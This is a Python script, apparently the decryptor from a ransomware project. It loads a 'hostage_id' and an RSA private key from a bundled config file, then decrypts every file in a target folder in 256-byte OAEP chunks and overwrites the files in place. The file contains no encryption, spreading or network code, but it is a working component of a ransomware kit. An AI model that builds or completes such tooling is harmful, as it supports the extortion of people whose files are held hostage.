import json
import os
import sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.backends import default_backend
import uuid

root_path = r'C:\Users\Usuario\Desktop\GitHub_Projects\ransomware\files'



def read_configuration():
    with open(resource_path('config.json'), 'r') as f:
        config = json.load(f)
    return config['hostage_id'], config['private_key']

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def decrypt(private_key_pem, data):
    try:
        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
        decrypted_chunks = []
        
        for i in range(0, len(data), 256):  # RSA 2048 key size / 8 = 256 bytes
            chunk = data[i:i+256]
            
            decrypted_chunk = private_key.decrypt(
                chunk,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            decrypted_chunks.append(decrypted_chunk)
        
        decrypted_data = b''.join(decrypted_chunks)
       
        return decrypted_data
    
    except Exception as e:
        print(f"Error decrypting data at chunk starting index {i}: {e}")
        return b""

if __name__ == "__main__":

    hostage_id, private_key = read_configuration()
    items = os.listdir(root_path)
    full_path = [os.path.join(root_path, item) for item in items]
    for item in full_path:
                    try:
                        with open(item, 'rb') as file:
                            encrypted_data = file.read()
                        
                        decrypted_data = decrypt(private_key.encode(), encrypted_data)
                        
                        if decrypted_data:
                            with open(item, 'wb') as file:
                                file.write(decrypted_data)
                            print(f"Decrypted: {item}")
                        else:
                            print(f"Failed to decrypt: {item}")
                        
                    except Exception as e:
                        print(f"Error decrypting file {item}: {e}")